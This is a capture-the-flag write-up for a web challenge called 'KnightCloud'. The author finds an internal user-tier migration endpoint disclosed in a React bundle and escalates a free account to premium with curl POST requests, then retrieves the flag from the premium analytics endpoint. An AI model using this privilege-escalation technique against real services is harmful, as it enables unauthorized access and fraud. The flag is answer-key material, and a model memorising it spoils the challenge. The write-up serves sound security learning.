KnightCloud Writeup

  Challenge Description
  Target: http://23.239.26.112:8091/
  Goal: Access the premium analytics dashboard without paying.

  Solution

   1. Reconnaissance:
      Upon visiting the site, it presents a login/register interface. Inspecting
  the page source reveals it is a Single Page Application (SPA) built with React.
      The main logic is contained in the JavaScript bundle located at
  /assets/index-DH6mLR_s.js.

   2. Code Analysis:
      Fetching and analyzing the JavaScript bundle revealed several interesting
  API endpoints, including internal ones:
       - /api/premium/analytics (The target)
       - /api/internal/v1/migrate/user-tier (Suspicious)

      Further inspection of the code, specifically at the end of the file,
  revealed a global object window.__KC_INTERNAL__ which contained configuration
  details and helper examples:

    1     window.__KC_INTERNAL__={
    2         ...,
    3         helpers: T,
    4         examples: {
    5             upgradeUserExample: {
    6                 endpoint: "/api/internal/v1/migrate/user-tier",
    7                 method: "POST",
    8                 body: { u: "user-uid-here", t: "premium" },
    9                 validTiers: ["free", "premium", "enterprise"]
   10             }
   11         },
   12         ...
   13     }
      This disclosed the exact parameters needed to interact with the internal
  migration endpoint: u (User ID) and t (Tier).

   3. Exploitation:
       - Register a User: First, I registered a new account (myuser1) to obtain a
         valid User ID (UID) and an authentication token.
           - Endpoint: /api/auth/register
           - Received UID: 8c66c7ce-0797-4cbb-8f86-6c1cf9bcc74a

       - Privilege Escalation: I sent a POST request to the internal migration
         endpoint with my user's UID and the target tier "premium".

   1         curl -X POST 
     http://23.239.26.112:8091/api/internal/v1/migrate/user-tier \
   2         -H "Content-Type: application/json" \
   3         -H "Authorization: Bearer <JWT_TOKEN>" \
   4         -d '{"u": "8c66c7ce-0797-4cbb-8f86-6c1cf9bcc74a", "t": "premium"}'
          The server responded with {"success":true,...}, confirming the upgrade.

       - Access Restricted Data: With the account now upgraded to "premium", I
         accessed the analytics endpoint.

   1         curl -X GET http://23.239.26.112:8091/api/premium/analytics \
   2         -H "Authorization: Bearer <JWT_TOKEN>"

   4. Flag Retrieval:
      The analytics endpoint returned the flag in the JSON response:

      KCTF{Pr1v1l3g3_3sc4l4t10n_1s_fun}
